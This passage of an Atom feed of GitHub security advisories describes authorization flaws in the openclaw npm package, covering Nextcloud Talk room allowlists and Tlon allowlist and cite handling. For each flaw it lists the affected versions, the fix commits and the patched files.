<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-mp66-rf4f-mhh8">https://github.com/openclaw/openclaw/security/advisories/GHSA-mp66-rf4f-mhh8</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/a47722de7e3c9cbda8d5512747ca7e3bb8f6ee66">https://github.com/openclaw/openclaw/commit/a47722de7e3c9cbda8d5512747ca7e3bb8f6ee66</a></li>
<li><a href="https://github.com/advisories/GHSA-mp66-rf4f-mhh8">https://github.com/advisories/GHSA-mp66-rf4f-mhh8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mp66-rf4f-mhh8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T21:37:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Nextcloud Talk room allowlist matched colliding room names instead of stable room tokens]]></title>
        <id>https://github.com/advisories/GHSA-xhq5-45pm-2gjr</id>
        <link href="https://github.com/advisories/GHSA-xhq5-45pm-2gjr"/>
        <updated>2026-03-26T21:34:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Nextcloud Talk room authorization matched on collidable room names instead of the stable room token, allowing policy confusion across similarly named rooms.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>a47722de7e3c9cbda8d5512747ca7e3bb8f6ee66</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>extensions/nextcloud-talk/src/inbound.ts now resolves allowlist policy from roomToken-backed room identity.</li>
<li>extensions/nextcloud-talk/src/policy.ts now keys room authorization on stable room tokens instead of display names.</li>
</ul>
<p>OpenClaw thanks @zpbrent for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-xhq5-45pm-2gjr">https://github.com/openclaw/openclaw/security/advisories/GHSA-xhq5-45pm-2gjr</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/a47722de7e3c9cbda8d5512747ca7e3bb8f6ee66">https://github.com/openclaw/openclaw/commit/a47722de7e3c9cbda8d5512747ca7e3bb8f6ee66</a></li>
<li><a href="https://github.com/advisories/GHSA-xhq5-45pm-2gjr">https://github.com/advisories/GHSA-xhq5-45pm-2gjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xhq5-45pm-2gjr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T21:34:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Tlon settings empty-allowlist reconciliation bypassed intended revocation]]></title>
        <id>https://github.com/advisories/GHSA-pw7h-9g6p-c378</id>
        <link href="https://github.com/advisories/GHSA-pw7h-9g6p-c378"/>
        <updated>2026-03-26T21:30:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Tlon settings reconciliation treated explicit empty allowlists as unset, which could silently undo an intended deny-all revocation.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>3cbf932413e41d1836cb91aed1541a28a3122f93</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>extensions/tlon/src/monitor/index.ts now honors explicit empty allowlists as authoritative deny-all configuration.</li>
<li>extensions/tlon/src/monitor/settings-helpers.test.ts ships regression coverage for explicit empty settings allowlists.</li>
</ul>
<p>Thanks @zpbrent for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-pw7h-9g6p-c378">https://github.com/openclaw/openclaw/security/advisories/GHSA-pw7h-9g6p-c378</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/3cbf932413e41d1836cb91aed1541a28a3122f93">https://github.com/openclaw/openclaw/commit/3cbf932413e41d1836cb91aed1541a28a3122f93</a></li>
<li><a href="https://github.com/advisories/GHSA-pw7h-9g6p-c378">https://github.com/advisories/GHSA-pw7h-9g6p-c378</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pw7h-9g6p-c378</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-26T21:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Tlon cite expansion happens before channel and DM authorization is complete]]></title>
        <id>https://github.com/advisories/GHSA-vfg3-pqpq-93m4</id>
        <link href="https://github.com/advisories/GHSA-vfg3-pqpq-93m4"/>
        <updated>2026-03-26T21:27:53.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Tlon cite expansion happened before channel and DM authorization completed, allowing cite work and content handling before the final auth decision.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>3cbf932413e41d1836cb91aed1541a28a3122f93</code></li>
<li><code>ebee4e2210e1f282a982c7ef2ad79d77a572fc87</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>extensions/tlon/src/monitor/index.ts now defers cite expansion until after authorization and preserves explicit empty-allowlist semantics.</li>
<li>extensions/tlon/src/monitor/utils.ts and extensions/tlon/src/security.test.ts ship the deferred cite expansion behavior and regressions.</li>
</ul>
<p>OpenClaw thanks @zpbrent for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-vfg3-pqpq-93m4">https://github.com/openclaw/openclaw/security/advisories/GHSA-vfg3-pqpq-93m4</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/3cbf932413e41d1836cb91aed1541a28a3122f93">https://github.com/openclaw/openclaw/commit/3cbf932413e41d1836cb91aed1541a28a3122f93</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/ebee4e2210e1f282a982c7ef2ad79d77a572fc87">https://github.com/openclaw/openclaw/commit/ebee4e2210e1f282a982c7ef2ad79d77a572fc87</a></li>
<li><a href="https://github.com/advisories/GHSA-vfg3-pqpq-93m4">https://github.com/advisories/GHSA-vfg3-pqpq-93m4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfg3-pqpq-93m4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T21:27:49.000Z</published>
    </entry>
</feed>